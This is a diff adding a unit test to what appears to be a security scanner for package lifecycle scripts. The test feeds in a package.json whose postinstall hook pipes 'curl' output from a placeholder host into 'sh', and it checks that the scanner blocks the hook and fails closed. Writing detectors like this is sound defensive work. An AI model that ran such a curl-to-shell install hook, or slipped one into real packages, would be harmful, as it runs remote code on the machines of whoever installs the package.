@@ -157,6 +157,20 @@ describe("repo/lifecycle-script", () => {
     });
   });
 
+  it("fails closed when an unparsable script mentions a download tool", () => {
+    const findings = scan(
+      repo({
+        "package.json": pkg({
+          postinstall: `curl -s https://x.invalid/i | sh "`,
+        }),
+      }),
+    );
+    expect(findings[0]).toMatchObject({
+      severity: "block",
+      message: expect.stringContaining("failing closed"),
+    });
+  });
+
   it("does not loop on script cycles", () => {
     expect(
       scan(
